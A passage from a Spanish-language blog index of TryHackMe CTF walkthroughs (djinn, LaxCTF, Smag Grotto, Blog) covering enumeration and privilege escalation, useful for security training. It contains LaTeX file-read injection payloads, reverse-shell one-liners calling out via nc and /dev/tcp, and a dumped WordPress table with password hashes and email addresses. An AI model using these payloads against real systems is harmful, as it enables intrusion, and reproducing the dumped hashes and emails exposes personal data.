nuestra maquina y utilizamos uncompyle6. Vemos en el codigo fuente, especificamente en la fucnion guessit() vemos que hace una comparacion de la variable s con num, en el input no realiza ninguna validacion de si lo ingresado es un entero o string, en esta funcion al adivinar el numero devuelve una shell con usuario root. Para poder aprovecharnos de este script vamos a ingresar el nombre de la variable num ya que la variable s no tiene ningun tipo de validacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # uncompyle6 version 3.7.3 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0] # Embedded file name: /home/mzfr/scripts/exp.py # Compiled at: 2019-11-07 07:05:18 from getpass import getuser from os import system from random import randint def naughtyboi(): print \u0026#39;Working on it!!\u0026#39; def guessit(): num = randint(1, 101) print \u0026#39;Choose a number between 1 to 100: \u0026#39; s = input(\u0026#39;Enter your number: \u0026#39;) if s == num: system(\u0026#39;/bin/sh\u0026#39;) else: print \u0026#39;Better Luck next time\u0026#39; [... REDACTED ...] if __name__ == \u0026#39;__main__\u0026#39;: main(options()) # okay decompiling file_pyc.pyc Logramos obtener nuestra shell con usuario root y flag user.txt.\n","description":"djinn es una maquina de TryHackMe, ejecutamos una shell inversa en una ruta de la aplicacion web, en el codigo fuente encontramos la ruta de un archivo con credenciales que nos permitio acutalizar nuestra shell al siguiente usuario que además obtuvimos acceso por SSH realizando Port Knocking. Para el movimiento lateral ejecutamos genie con parametros para una shell. Escalamos privilegios analizando el codigo fuente de un script en Python el cual no tenia validaciones en las variables lo que nos permitía ejecutar /bin/sh.","id":116,"section":"posts","tags":["ftp","knockd","port knocking","python","uncompyle6"],"title":"TryHackMe - djinn","uri":"https://sckull.github.io/posts/djinn/"},{"content":"\rLaxCTF es una maquina de TryHackMe, descubrimos LaTex con una vulnerabilidad lo que nos permitio leer un fichero cifrado, y, con el analisis de codigo fuente a un APK obtuvimos credenciales para SSH. Escalamos privilegios mediante un CronJob y un archivo ovpn.\nRoom Titulo LaxCTF Descripción Try Harder! Puntos * Dificultad Media Maker stuxnet NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Wed Jul 29 19:15:28 2020 as: nmap -sV -o nmap_scan_mini lax.thm Nmap scan report for lax.thm (10.10.90.68) Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 19:16:41 2020 -- 1 IP address (1 host up) scanned in 72.59 seconds HTTP Encontramos una pagina web en el puerto 80.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 root@upset:~/thm/lax# /opt/rustbuster/rustbuster dir -e php,html,txt -t 250 -u http://lax.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2020-07-29 20:57:11 GET\t200 OK\thttp://lax.thm/ GET 403 Forbidden http://lax.thm/.html GET 403 Forbidden http://lax.thm/.php GET 200 OK http://lax.thm/index.php GET 301 Moved Permanently http://lax.thm/pdf =\u0026gt; http://lax.thm/pdf/ GET 301 Moved Permanently http://lax.thm/templates =\u0026gt; http://lax.thm/templates/ GET 301 Moved Permanently http://lax.thm/assets =\u0026gt; http://lax.thm/assets/ GET 200 OK http://lax.thm/ajax.php GET 301 Moved Permanently http://lax.thm/javascript =\u0026gt; http://lax.thm/javascript/ GET 200 OK http://lax.thm/config.php GET 200 OK http://lax.thm/flag.php GET 301 Moved Permanently http://lax.thm/compile =\u0026gt; http://lax.thm/compile/ GET 301 Moved Permanently http://lax.thm/Google-Earth =\u0026gt; http://lax.thm/Google-Earth/ GET 200 OK http://lax.thm/ GET 403 Forbidden http://lax.thm/.php GET 403 Forbidden http://lax.thm/.html C^ LaTeX - EXPLOIT En la pagina encontramos pdfTeX para generar PDF a partir de un template y texto ingresado, ingresamos un texto cualquiera y nos devuelve la direccion en donde se encuentra el PDF. Además la version de pdfTeX Version 3.14159265-2.6-1.40.16\nEn la direccion, el PDF con el texto ingresado.\nCon el siguiente \u0026ldquo;payload\u0026rdquo; logramos obtener la primera linea del archivo /etc/passwd\n1 2 3 4 5 \\newread\\file \\openin\\file=/etc/passwd \\read\\file to\\line \\text{\\line} \\closein\\file Intentamos utilizar el mismo payload que utilizamos en CHAOS - HTB pero al parecer tiene un blacklist parecido a este:\n1 \u0026#34;(input|include|write18|immediate)\u0026#34; Por lo que no es posible utilizar los \u0026ldquo;comandos\u0026rdquo; conocidos. Probamos diferentes combinaciones pero ninguna de estas combinaciones funcionó. Reallizamos una busqueda de un posible exploit en google y encontramos un PoC en Moodle \u0026lt; 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure donde indica como es posible leer archivos a traves del siguiente payload:\n1 \u0026#34;$$ \\input{/etc/passwd} $$\u0026#34; Logramos leer el archivo e incrustarlo en el PDF:\nAdemás, dentro de la respuesta al enviar el PoC encontramos el contenido del archivo /etc/passwd con la informacion desordenada, donde logramos ver uno de los usuarios con su directorio principal y una carpeta no muy comun dentro de este archivo. Uno de los usuarios es Lax o king (Lax puede referirse al hostname) y su carpeta principal se encuentra en /home/king, el otro directorio es /opt/secret.\nUtilizando el directorio principal del usuario que encontramos podemos leer nuestra flag user.txt.\n1 \u0026#34;$$ \\input{/home/king/user.txt} $$\u0026#34; Hicimos lo mismo con /opt/secret pero a un principio no tenia nada en su interior, pero al inspeccionar el codigo fuente encontramos strings separadas por etiquetas HTML.\nUtilizamos HTML-strip para poder eliminar las etiquetas y obtener el texto completo, además eliminamos todos los espacios existentes y caracteres al inicio y al final \u0026quot; y 1. Logramos leer lo que parece una encriptacion AES en modo CBC pero para obtener el texto necesitamos KEY e IV.\n1 2 3 AES/CBC/128d2X+7fLZAq4as9qs7yGRdWANgbFVDaly2j2TjnKbeCq8bH3iR2XpyXBVjSCsrGLmTAhyffVoOgbhmVl5vDDMNvC6wJNfEZWa+MkF8HGQBcrE9pYSHag8jxC4vFwyINMOq53YR2GXUZFvA/qipjUStx3N69Wc7f3QpDVKRmGudEPhw0AMnnbICAvCNPoXIdyOK3I2zKM+za8z7+7V6Ut5gWCKQezKa+l91GNQWj1iUKU0rlzTmr49Fkcwlw01E0tr3DqQv8BV0V3eCs7mRnUCzdW4tnRH9J9eP7likT [... REDACTED ...] g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+HVAfxfh8RB3pZ3cG+uzCe1xSMcx0JfSld1Hfa3hJK75zVWwcfu4EvVZ1ghlZwtm7Ls= KING - USER APK Encontramos un apk en /Google-Earth/ y utilizamos jadx para leer el codigo fuente de la aplicacion, en donde encontramos funciones para encriptar y desencriptar, además encontramos el IV y KEY.\nUtilizamos CyberChef para desencriptar el texto (eliminamos AES/CBC/128).\nEl texto esta codificado en brainfuck, utilizamos dcode.fr\nNuevamente utilizamos CyberChef para obtener lo que parecen credenciales del usuario king.\nLogramos obtener una shell con el usuario King.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con pspy y encontramos que se ejecuta un cron, el problema es de que no sabemos cual es el contenido de dicho archivo (run.sh).\nEn el directorio principal de king encontramos un archivo ovpn por lo que agregamos una shell inversa al igual que en VAULT - HTB esperando a alguna conexion a nuestra maquina.\n1 2 3 4 5 remote 10.10.90.68 dev tun nobind script-security 2 up \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.1/1338 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Logramos obtener una shell con usuario root y nuestra flag root.txt.\nRevisamos el archivo run.sh y es el que ejecutó el archivo ovpn.\n1 openvpn /home/king/tryhackme.ovpn Payloads - Latex Injection\n","description":"LaxCTF es una maquina de TryHackMe, descubrimos LaTex con una vulnerabilidad lo que nos permitio leer un fichero cifrado, y, con el analisis de codigo fuente a un APK obtuvimos credenciales para SSH. Escalamos privilegios mediante un CronJob y un archivo ovpn.","id":117,"section":"posts","tags":["laTex","jadx","brainfuck","cron","openvpn"],"title":"TryHackMe - LaxCTF","uri":"https://sckull.github.io/posts/laxctf/"},{"content":"\rSmag Grotto es una maquina de TryHackMe, analizamos un archivo PCAP donde encontramos credenciales para ingresar en la plataforma y ejecutar una shell inversa. Cambiamos al siguiente usuario tomando ventaja de un CronJob. Escalamos privilegios utilizando APT.\nRoom Titulo Smag Grotto Descripción Follow the yellow brick road. Puntos 160 Dificultad Facil Maker jakeyee NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Wed Jul 29 17:29:14 2020 as: nmap -sV -o nmap_scan_mini smag.thm Nmap scan report for smag.thm (10.10.138.62) Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 17:29:58 2020 -- 1 IP address (1 host up) scanned in 44.14 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 root@upset:~/thm/smag# gobuster dir -u http://smag.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.php (Status: 200) /mail (Status: 301) WWW-DATA - USER Encontramos la pagina /mail donde vemos algunos correos, en uno de ellos un archivo pcap.\nAnalizamos el archivo y encontramos credenciales, además de ello un subdominio.\n1 2 3 4 5 6 7 8 9 10 11 12 POST /login.php HTTP/1.1 Host: development.smag.thm User-Agent: curl/7.47.0 Accept: */* Content-Length: 39 Content-Type: application/x-www-form-urlencoded username=help[... REDACTED ...]\u0026amp;password=cH4nG3M3_[... REDACTED ...]HTTP/1.1 200 OK Date: Wed, 03 Jun 2020 18:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Content-Length: 0 Content-Type: text/html; charset=UTF-8 Agregamos el subdominio en nuestro archivo /etc/hosts. Visitamos el puerto 80 y encontramos archivos css y php.\nUtilizamos las credenciales en el panel de login.php donde logramos obtener acceso a una pagina para ingresar comandos.\nEnviamos un ping hacia nuestra maquina y logramos obtener paquetes desde la maquina (smag.thm).\nEjecutamos la siguiente shell inversa con nuestra IP y PUERTO para obtener una shell con el usuario www-data.\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.0 1338 \u0026gt;/tmp/f USER - JAKE Dentro de la maquina, enumeramos los directorios, en /opt/ encontramos un directorio con un archivo que contiene la clave publica (id_rsa.pub) del usuario jake.\nRevisamos los crons de la maquina y encontramos que el contenido de este ultimo archivo se agrega al archivo authorized_keys del usuario jake, por lo que podemos agregar nuestra clave publica al archivo /opt/.backups/jake_id_rsa.pub.backup para poder ingresar en el servicio SSH utilizando el usuario Jake.\nAuthorized_Keys - SSH\nAgregamos nuestra clave publica y esperamos hasta que se agregue en el archivo de Jake.\nIngresamos con el usuario Jake en SSH sin ninguna contraseña, y logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando apt-get. Utilizamos apt-get para obtener una shell root y nuestra flag root.txt.\n","description":"Smag Grotto es una maquina de TryHackMe, analizamos un archivo PCAP donde encontramos credenciales para ingresar en la plataforma y ejecutar una shell inversa. Cambiamos al siguiente usuario tomando ventaja de un CronJob. Escalamos privilegios utilizando APT.","id":118,"section":"posts","tags":[],"title":"TryHackMe - Smag Grotto","uri":"https://sckull.github.io/posts/smag/"},{"content":"\rBlog es una maquina de TryHackMe, presenta retos de esteganografia, ataque de contraseñas y una vulnerabilidad en WordPress para obtener acceso. Con el codigo fuente de una fichero SUID exportamos una variable de entorno que nos devolvio una shell como root.\nRoom Titulo Blog Descripción Billy Joel made a Wordpress blog! Puntos 350 Dificultad Media Maker Nameless0ne NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Nmap 7.80 scan initiated Thu Jul 23 16:31:53 2020 as: nmap -sV -o nmap_scan_mini blog.thm Nmap scan report for blog.thm (10.10.91.166) Host is up (0.26s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 23 16:32:56 2020 -- 1 IP address (1 host up) scanned in 63.00 seconds SAMBA Utilizamos smbclient para enumerar los SHARENAMES, encontramos BillySMB en el cual logramos descargar algunos archivos multimedia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root@upset:~/thm/blog# smbclient -L blog.thm Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy\u0026#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available root@upset:~/thm/blog# smbclient \\\\\\\\blog.thm\\\\BillySMB Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue May 26 13:17:05 2020 .. D 0 Tue May 26 12:58:23 2020 Alice-White-Rabbit.jpg N 33378 Tue May 26 13:17:01 2020 tswift.mp4 N 1236733 Tue May 26 13:13:45 2020 check-this.png N 3082 Tue May 26 13:13:43 2020 15413192 blocks of size 1024. 9788768 blocks available smb: \\\u0026gt; get Alice-White-Rabbit.jpg getting file \\Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (18.8 KiloBytes/sec) (average 18.8 KiloBytes/sec) smb: \\\u0026gt; get check-this.png getting file \\check-this.png of size 3082 as check-this.png (2.5 KiloBytes/sec) (average 12.2 KiloBytes/sec) smb: \\\u0026gt; get tswift.mp4 getting file \\tswift.mp4 of size 1236733 as tswift.mp4 (110.8 KiloBytes/sec) (average 89.9 KiloBytes/sec) smb: \\\u0026gt; Archivos encontrados:\nUtilizamos steghide en el archivo JPG para verificar si tenian archivos ocultos, pero solo fuimos trolleados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@upset:~/thm/blog# steghide Alice-White-Rabbit.jpg steghide: unknown command \u0026#34;Alice-White-Rabbit.jpg\u0026#34;. steghide: type \u0026#34;steghide --help\u0026#34; for help. root@upset:~/thm/blog# steghide info Alice-White-Rabbit.jpg \u0026#34;Alice-White-Rabbit.jpg\u0026#34;: format: jpeg capacity: 1.8 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;rabbit_hole.txt\u0026#34;: size: 48.0 Byte encrypted: rijndael-128, cbc compressed: yes root@upset:~/thm/blog# steghide extract -sf Alice-White-Rabbit.jpg Enter passphrase: wrote extracted data to \u0026#34;rabbit_hole.txt\u0026#34;. root@upset:~/thm/blog# cat rabbit_hole.txt You\u0026#39;ve found yourself in a rabbit hole, friend. El archivo QR al escanearlo nos devuelve una URL, esta url nos redirige a un video de youtube.\nHTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, vemos que tiene directorios que pertenecen a Wordpress.\nroot@upset:~/thm/blog# gobuster dir -u http://blog.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt\r/rss (Status: 301)\r/index.php (Status: 301)\r/login (Status: 302)\r/0 (Status: 301)\r/feed (Status: 301)\r/atom (Status: 301)\r/wp-content (Status: 301)\r/admin (Status: 302)\r/welcome (Status: 301)\r/wp-login.php (Status: 200)\r/n (Status: 301)\r/w (Status: 301)\r/rss2 (Status: 301)\r/license.txt (Status: 200)\r/wp-includes (Status: 301)\r/readme.html (Status: 200)\r/wp-register.php (Status: 301)\r/no (Status: 301)\r/wp-rss2.php (Status: 301)\r/rdf (Status: 301)\r/page1 (Status: 301)\r/robots.txt (Status: 200)\r/\u0026#39; (Status: 301)\r/dashboard (Status: 302)\r/note (Status: 301)\r/%20 (Status: 301) WPSCAN Utilizamos wpscan para enumerar version, usuarios, plugins y temas vulnerables de Wordpress. Encontramos dos usuarios registrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 [+] URL: http://blog.thm/ [+] Started: Thu Jul 23 16:52:47 2020 Interesting Finding(s): [+] http://blog.thm/ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] http://blog.thm/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] http://blog.thm/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://blog.thm/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] http://blog.thm/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Rss Generator (Passive Detection) | - http://blog.thm/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; | - http://blog.thm/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://blog.thm/wp-content/themes/twentytwenty/ | Last Updated: 2020-06-10T00:00:00.000Z | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:06 \u0026lt;====================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:06 [i] User(s) Identified: [+] kwheel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] bjoel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Karen Wheeler | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [+] Billy Joel | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up. [+] Finished: Thu Jul 23 16:53:07 2020 [+] Requests Done: 24 [+] Cached Requests: 35 [+] Data Sent: 6.06 KB [+] Data Received: 154.571 KB [+] Memory used: 117.724 MB [+] Elapsed time: 00:00:19 Utilizamos wpscan para hacer un ataque de fuerza bruta con los usuarios que encontramos, primero intentamos con el usuario kwheel al que logramos encontrar la contraseña.\nWWW-DATA - USER Con las credenciales que encontramos, editamos el archivo, pero no podemos realizar alguna modificacion a los archivos.\nBuscamos exploits/vulnerabilidades de la version de wordpress y vemos un exploit para metasploit que afecta esta version.\n1 2 3 4 5 6 7 8 9 root@upset:~/thm/blog# searchsploit wordpress 5.0 ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- WordPress 5.0.0 - Crop-image Shell Upload (Metasploit) | exploits/php/remote/46662.rb [ ... REDACTED ...] ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Utilizamos metasploit con el exploit que encontramos y logramos obtener una shell en la maquina con el usuario www-data.\nEn el directorio /home/bjoel encontramos la \u0026ldquo;flag user.txt\u0026rdquo; pero no contiene lo que buscamos, además encontramos un pdf que tiene informacion sobre Rubber Ducky.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 www-data@blog:/home/bjoel$ ls -lah total 100K drwxr-xr-x 4 bjoel bjoel 4.0K May 26 20:08 . drwxr-xr-x 3 root root 4.0K May 26 18:02 .. lrwxrwxrwx 1 root root 9 May 26 18:18 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 bjoel bjoel 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 bjoel bjoel 3.7K Apr 4 2018 .bashrc drwx------ 2 bjoel bjoel 4.0K May 25 13:15 .cache drwx------ 3 bjoel bjoel 4.0K May 25 13:15 .gnupg -rw-r--r-- 1 bjoel bjoel 807 Apr 4 2018 .profile -rw-r--r-- 1 bjoel bjoel 0 May 25 13:16 .sudo_as_admin_successful -rw-r--r-- 1 bjoel bjoel 68K May 26 18:33 Billy_Joel_Termination_May20-2020.pdf -rw-r--r-- 1 bjoel bjoel 57 May 26 20:08 user.txt www-data@blog:/home/bjoel$ cat user.txt cat user.txt You won\u0026#39;t find what you\u0026#39;re looking for here. TRY HARDER www-data@blog:/home/bjoel$ Billy_Joel_Termination_May20-2020.pdf\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la maquina por binarios/archivos SUID, encontramos un archivo ejecutable, al ejecutarlo nos muestra un mensaje de Not an Admin.\n1 2 3 4 5 6 ind / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah [... REDACTED ...] -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-sr-x 1 root root 8.3K May 26 18:27 /usr/sbin/checker file /usr/sbin/checker /usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped Revisamos los strings del ejecutable y encontramos algunos strings interesantes, como /bin/bash, setuid, puts, getenv, system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid puts getenv system [... REDACTED ...] admin /bin/bash Not an Admin ;*3$\u0026#34; GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones [... REDACTED ...] Utilizamos Ghidra para analizar el archivo, vemos la funcion main, donde tiene una variable que obtiene (getenv()) la variable admin, en el caso de que esta variable este vacia se cierra el programa, en otro caso retorna una shell con usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 undefined8 main(void) { char *pcVar1; pcVar1 = getenv(\u0026#34;admin\u0026#34;); if (pcVar1 == (char *)0x0) { puts(\u0026#34;Not an Admin\u0026#34;); } else { setuid(0); system(\u0026#34;/bin/bash\u0026#34;); } return 0; } En la maquina creamos la variable $admin a quien le pasamos un directorio cualquiera, ejecutamos el ejecutable y logramos obtener una shell con usuario root y la flag root.txt.\nFinalmente, buscamos la flag user.txt.\nANEXO - DATABASE BLOG Logramos entrar al servicio de mysql sin credenciales utilizando el usuario root, donde encontramos las credenciales de los usuarios de la base de datos de wordpress (blog).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 +--------------------+ | Database | +--------------------+ | information_schema | | blog | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) +-----------------------+ | Tables_in_blog | +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql\u0026gt; describe wp_users; +---------------------+---------------------+------+-----+---------------------+----------------+ | Field | Type | Null | Key | Default | Extra | +---------------------+---------------------+------+-----+---------------------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | user_login | varchar(60) | NO | MUL | | | | user_pass | varchar(255) | NO | | | | | user_nicename | varchar(50) | NO | MUL | | | | user_email | varchar(100) | NO | MUL | | | | user_url | varchar(100) | NO | | | | | user_registered | datetime | NO | | 0000-00-00 00:00:00 | | | user_activation_key | varchar(255) | NO | | | | | user_status | int(11) | NO | | 0 | | | display_name | varchar(250) | NO | | | | +---------------------+---------------------+------+-----+---------------------+----------------+ 10 rows in set (0.00 sec) mysql\u0026gt; select * from wp_users; +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | 1 | bjoel | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel | nconkl1@outlook.com | | 2020-05-26 03:52:26 | | 0 | Billy Joel | | 3 | kwheel | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel | zlbiydwrtfjhmuuymk@ttirv.net | | 